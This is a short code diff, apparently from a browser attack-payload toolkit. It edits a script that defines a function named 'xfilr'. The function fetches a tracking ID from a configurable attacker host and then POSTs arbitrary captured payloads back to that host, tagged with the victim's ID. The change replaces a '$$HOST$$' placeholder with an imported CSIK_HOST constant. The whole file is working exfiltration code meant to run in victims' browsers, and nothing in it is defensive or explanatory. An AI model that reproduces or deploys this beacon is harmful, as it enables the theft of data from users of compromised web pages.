@@ -1,7 +1,9 @@
+const { CSIK_HOST } = require('../../payloadVariables')
+
 window.x_id = 'not-sup';
 window.xfilr = (function() {
    var xhr = new XMLHttpRequest();
-   xhr.open('GET', '$$HOST$$/id', true);
+   xhr.open('GET', CSIK_HOST + '/id', true);
    xhr.onload = function (res) {
      window.x_id = res;
    };
@@ -14,7 +16,7 @@ window.xfilr = (function() {
 
   return function(type, payload) {
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', '$$HOST$$/' + type + '?i=' + (typeof window.x_id === 'object' ? JSON.parse(window.x_id.target.responseText).val : window.x_id), true);
+    xhr.open('POST', CSIK_HOST + '/' + type + '?i=' + (typeof window.x_id === 'object' ? JSON.parse(window.x_id.target.responseText).val : window.x_id), true);
     xhr.send(JSON.stringify(payload));
   }
 })();
